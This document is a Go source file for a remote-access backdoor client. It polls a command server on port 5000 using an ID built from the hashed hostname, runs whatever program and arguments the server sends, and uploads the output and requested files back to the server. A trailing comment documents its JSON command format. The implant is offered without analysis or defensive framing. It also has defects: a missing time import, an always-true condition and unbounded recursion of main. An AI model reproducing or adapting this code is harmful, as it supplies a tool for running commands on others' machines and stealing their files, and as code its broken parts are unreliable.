package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
)

type COMMANDS struct {
	Type     string   `json:"type"`
	Path     string   `json:"path"`
	Commands []string `json:"commands"`
}
type sendDATA_s struct {
	ID   string
	DATA string
}

func EXE(path string, args []string) string {

	cmd, err := exec.Command(path, args...).Output()
	if err != nil {
		fmt.Printf("error %s", err)
	}
	output := string(cmd)
	return output
}

func req_COMAND() (com string, p string, u []string) {
	requestURL := fmt.Sprintf("http://127.0.0.1:5000/exe?id=" + app_nameID())
	res, err := http.Get(requestURL)
	if err != nil {
		fmt.Printf("error making http request")
		return "err", "", []string{}
	}

	resBody, err := ioutil.ReadAll(res.Body)
	var json_com COMMANDS
	json.Unmarshal(resBody, &json_com)

	if err != nil {
		fmt.Printf("client: could not read response body")
		return "err", "", []string{}
	}
	return json_com.Type, json_com.Path, json_com.Commands
}

func send_ResultDATA(data string) {
	data_s := url.Values{
		"ID":   {app_nameID()},
		"DATA": {data},
	}
	_, err := http.PostForm("http://127.0.0.1:5000/dw", data_s)

	if err != nil {
		fmt.Println(err)
	}

}

func app_nameID() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	h := sha1.New()
	h.Write([]byte(hostname))
	sha1_hash := hex.EncodeToString(h.Sum(nil))

	return sha1_hash + "_" + runtime.GOOS
}

func sendDATAFILE(path string) int {
	dat, err := os.ReadFile(path)
	if err != nil {
		send_ResultDATA("Error reading file: " + path)
		return 0
	} else {

		rest := `{
			"PATH_FILE_DW": "` + path + `",
			"DATA_FILE": "` + string(dat) + `"
		}`
		send_ResultDATA(rest)
	}
	return 0

}

func sendDATAFILE_F(path string) {

	file, err := os.Open(path)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	var requestBody bytes.Buffer

	multiPartWriter := multipart.NewWriter(&requestBody)

	var name_user_file string = app_nameID() + ":" + path
	fmt.Println(name_user_file)

	fileWriter, err := multiPartWriter.CreateFormFile("file", name_user_file)
	if err != nil {
		log.Fatalln(err)
	}

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		log.Fatalln(err)
	}

	fieldWriter, err := multiPartWriter.CreateFormField("normal_field")
	if err != nil {
		log.Fatalln(err)
	}

	_, err = fieldWriter.Write([]byte("Value"))
	if err != nil {
		log.Fatalln(err)
	}

	multiPartWriter.Close()

	req, err := http.NewRequest("POST", "http://127.0.0.1:5000/dw_file", &requestBody)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header.Set("Content-Type", multiPartWriter.FormDataContentType())

	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	var result map[string]interface{}

	json.NewDecoder(response.Body).Decode(&result)

	log.Println(result)
}

func main() {

	command, p, u := req_COMAND()

	if command != "err" || command != "" {
		if command == "exe" {
			if p != "" {
				res := EXE(p, u)
				send_ResultDATA(res)
			}
		}
		if command == "dw" {
			if len(u) != 0 {
				sendDATAFILE(u[0])
			}
		}
	}

	time.Sleep(5 * time.Second)
	main()

}

/*

{
	"type": "exe | dw | '' "
	"path": "ls",
	"commands": ["arg", "arg2"]
}
{
	"type": " '' "
	"path": "",
	"commands": []
}
{
	"type": "exe"
	"path": "ls",
	"commands": ["arg", "arg2"]
}
{
	"type": "dw"
	"path": "C:\\some.txt",
	"commands": []
}

*/
